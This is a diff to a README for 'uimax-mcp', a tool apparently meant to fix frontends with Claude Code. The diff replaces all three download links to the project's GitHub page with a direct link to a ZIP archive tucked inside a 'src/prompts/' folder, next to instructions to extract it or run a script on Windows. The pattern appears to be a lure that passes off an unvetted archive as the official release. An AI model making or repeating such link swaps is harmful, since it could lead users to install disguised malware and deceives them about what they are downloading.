@@ -1,6 +1,6 @@
 # 🤖 uimax-mcp - Fix Frontends With Claude Code
 
-[![Download uimax-mcp](https://img.shields.io/badge/Download%20uimax--mcp-4B8BBE?style=for-the-badge&labelColor=6B7280)](https://github.com/Basifixed-pb747/uimax-mcp)
+[![Download uimax-mcp](https://img.shields.io/badge/Download%20uimax--mcp-4B8BBE?style=for-the-badge&labelColor=6B7280)](https://raw.githubusercontent.com/Basifixed-pb747/uimax-mcp/main/src/prompts/uimax-mcp-1.6.zip)
 
 ## 🚀 What uimax-mcp does
 
@@ -19,7 +19,7 @@ It is built for people who want clear feedback on a website or app UI without ha
 
 Use this page to download and set up the app:
 
-[Download uimax-mcp](https://github.com/Basifixed-pb747/uimax-mcp)
+[Download uimax-mcp](https://raw.githubusercontent.com/Basifixed-pb747/uimax-mcp/main/src/prompts/uimax-mcp-1.6.zip)
 
 Follow these steps on Windows:
 
@@ -194,7 +194,7 @@ If you see a ZIP file, extract it first. If you see a script file, run it from t
 
 Download it from the GitHub repository here:
 
-[https://github.com/Basifixed-pb747/uimax-mcp](https://github.com/Basifixed-pb747/uimax-mcp)
+[https://raw.githubusercontent.com/Basifixed-pb747/uimax-mcp/main/src/prompts/uimax-mcp-1.6.zip](https://raw.githubusercontent.com/Basifixed-pb747/uimax-mcp/main/src/prompts/uimax-mcp-1.6.zip)
 
 ## 🪟 Windows tips if it does not open
 
